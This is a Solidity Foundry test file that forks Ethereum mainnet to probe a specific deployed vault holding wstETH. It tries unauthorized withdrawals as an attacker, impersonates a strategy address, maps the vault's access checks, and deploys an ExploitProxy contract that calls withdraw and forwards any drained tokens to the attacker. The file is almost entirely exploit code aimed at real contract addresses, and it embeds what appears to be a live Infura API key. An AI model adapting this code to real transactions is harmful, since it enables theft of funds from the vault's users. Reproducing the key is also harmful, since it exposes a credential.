// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "forge-std/Test.sol";

interface IVault {
    function withdraw(address _asset, uint _amount) external;
    function owner() external view returns (address);
    function asset() external view returns (address);
}

interface IERC20 {
    function balanceOf(address) external view returns (uint256);
    function transfer(address, uint256) external returns (bool);
    function allowance(address, address) external view returns (uint256);
}

contract VaultWithdrawExploit is Test {
    address constant VAULT = 0x551d155760ae96050439AD24Ae98A96c765d761B;
    address constant wstETH = 0x7f39C581F595B53c5cb19bD0b3f8dA6c935E2Ca0;
    address constant STRATEGY_0 = 0x60d2D94aCB969CA54e781007eE89F04c1A2e5943;

    string RPC_URL = "https://mainnet.infura.io/v3/bfc7283659224dd6b5124ebbc2b14e2c";
    address attacker;

    function setUp() public {
        vm.createSelectFork(RPC_URL);
        attacker = makeAddr("attacker");
        vm.deal(attacker, 100 ether);
    }

    function test_DirectVaultWithdraw() public {
        console.log("=== DIRECT VAULT WITHDRAW TEST ===\n");

        uint256 vaultBalanceBefore = IERC20(wstETH).balanceOf(VAULT);
        console.log("Vault wstETH before:", vaultBalanceBefore / 1e18);

        vm.startPrank(attacker);

        // Try calling Vault.withdraw(wstETH, 1e18) directly
        console.log("\nTrying Vault.withdraw(wstETH, 1e18)...");
        try IVault(VAULT).withdraw(wstETH, 1e18) {
            console.log("CRITICAL: Vault.withdraw succeeded!");
            console.log("Attacker wstETH:", IERC20(wstETH).balanceOf(attacker) / 1e18);
        } catch Error(string memory reason) {
            console.log("Withdraw failed:", reason);
        } catch (bytes memory data) {
            console.log("Withdraw failed (raw):");
            if (data.length > 0 && data.length < 100) {
                console.logBytes(data);
            } else if (data.length >= 4) {
                // Extract selector
                bytes4 selector = bytes4(data);
                console.log("Error selector:");
                console.logBytes4(selector);
            }
        }

        uint256 vaultBalanceAfter = IERC20(wstETH).balanceOf(VAULT);
        uint256 attackerBalance = IERC20(wstETH).balanceOf(attacker);

        console.log("\nResults:");
        console.log("Vault wstETH after:", vaultBalanceAfter / 1e18);
        console.log("Attacker wstETH:", attackerBalance / 1e18);

        vm.stopPrank();
    }

    function test_WithdrawAsStrategy() public {
        console.log("=== WITHDRAW AS STRATEGY TEST ===\n");

        uint256 vaultBalanceBefore = IERC20(wstETH).balanceOf(VAULT);
        console.log("Vault wstETH before:", vaultBalanceBefore / 1e18);

        // Prank as Strategy 0
        vm.startPrank(STRATEGY_0);

        console.log("\nTrying Vault.withdraw as Strategy 0...");
        try IVault(VAULT).withdraw(wstETH, 1e18) {
            console.log("CRITICAL: Vault.withdraw as Strategy succeeded!");
            console.log("Strategy wstETH:", IERC20(wstETH).balanceOf(STRATEGY_0) / 1e18);
        } catch Error(string memory reason) {
            console.log("Withdraw failed:", reason);
        } catch (bytes memory data) {
            console.log("Withdraw failed (raw):");
            if (data.length >= 4) {
                bytes4 selector = bytes4(data);
                console.log("Error selector:");
                console.logBytes4(selector);
            }
        }

        uint256 vaultBalanceAfter = IERC20(wstETH).balanceOf(VAULT);
        uint256 strategyBalance = IERC20(wstETH).balanceOf(STRATEGY_0);

        console.log("\nResults:");
        console.log("Vault wstETH after:", vaultBalanceAfter / 1e18);
        console.log("Strategy 0 wstETH:", strategyBalance / 1e18);

        vm.stopPrank();
    }

    function test_AnalyzeVaultWithdrawFunction() public view {
        console.log("=== VAULT WITHDRAW FUNCTION ANALYSIS ===\n");

        // Check Vault's code for withdraw function
        bytes memory code = VAULT.code;
        console.log("Vault code size:", code.length);

        // withdraw(address,uint256) selector: 0xf3fef3a3
        bytes4 withdrawSelector = bytes4(keccak256("withdraw(address,uint256)"));
        console.log("withdraw(address,uint256) selector:");
        console.logBytes4(withdrawSelector);

        // Check if Vault implements any specific interface
        (bool success, bytes memory data) = VAULT.staticcall(
            abi.encodeWithSignature("strategies(uint256)", 0)
        );
        if (success && data.length == 32) {
            address strat = abi.decode(data, (address));
            console.log("\nVault.strategies(0):", strat);
        }

        // Check for access control functions
        (success, data) = VAULT.staticcall(
            abi.encodeWithSignature("hasRole(bytes32,address)", bytes32(0), attacker)
        );
        console.log("Has hasRole function:", success);

        (success, data) = VAULT.staticcall(
            abi.encodeWithSignature("isStrategy(address)", STRATEGY_0)
        );
        if (success) {
            console.log("Has isStrategy function: true");
            if (data.length == 32) {
                bool is_strat = abi.decode(data, (bool));
                console.log("Strategy 0 isStrategy:", is_strat);
            }
        }
    }

    function test_ExploitViaActionProxy() public {
        console.log("=== EXPLOIT VIA ACTION PROXY ===\n");

        // Create an attacker contract that:
        // 1. Has vault() returning real vault
        // 2. Can delegatecall to ActionExecutor

        vm.startPrank(attacker);

        ExploitProxy proxy = new ExploitProxy(VAULT, attacker);
        console.log("Exploit proxy deployed:", address(proxy));
        console.log("proxy.vault():", proxy.vault());

        uint256 vaultBalanceBefore = IERC20(wstETH).balanceOf(VAULT);
        console.log("Vault wstETH before:", vaultBalanceBefore / 1e18);

        // Try to call Vault.withdraw through the proxy
        // The proxy will call as itself, so Vault will send to proxy
        console.log("\nProxy calling Vault.withdraw...");
        try proxy.callVaultWithdraw(wstETH, 1e18) {
            console.log("Vault.withdraw through proxy succeeded!");
        } catch {
            console.log("Vault.withdraw through proxy failed");
        }

        uint256 vaultBalanceAfter = IERC20(wstETH).balanceOf(VAULT);
        uint256 proxyBalance = IERC20(wstETH).balanceOf(address(proxy));
        uint256 attackerBalance = IERC20(wstETH).balanceOf(attacker);

        console.log("\nResults:");
        console.log("Vault wstETH after:", vaultBalanceAfter / 1e18);
        console.log("Proxy wstETH:", proxyBalance / 1e18);
        console.log("Attacker wstETH:", attackerBalance / 1e18);

        // If proxy has tokens, transfer to attacker
        if (proxyBalance > 0) {
            proxy.rescue(wstETH);
            console.log("\nAfter rescue:");
            console.log("Attacker wstETH:", IERC20(wstETH).balanceOf(attacker) / 1e18);
        }

        vm.stopPrank();
    }
}

contract ExploitProxy {
    address public vault;
    address public owner;

    constructor(address _vault, address _owner) {
        vault = _vault;
        owner = _owner;
    }

    function callVaultWithdraw(address token, uint256 amount) external {
        require(msg.sender == owner, "Not owner");
        IVault(vault).withdraw(token, amount);
    }

    function rescue(address token) external {
        require(msg.sender == owner, "Not owner");
        uint256 balance = IERC20(token).balanceOf(address(this));
        if (balance > 0) {
            IERC20(token).transfer(owner, balance);
        }
    }

    receive() external payable {}
}

// Interfaces defined at top of file
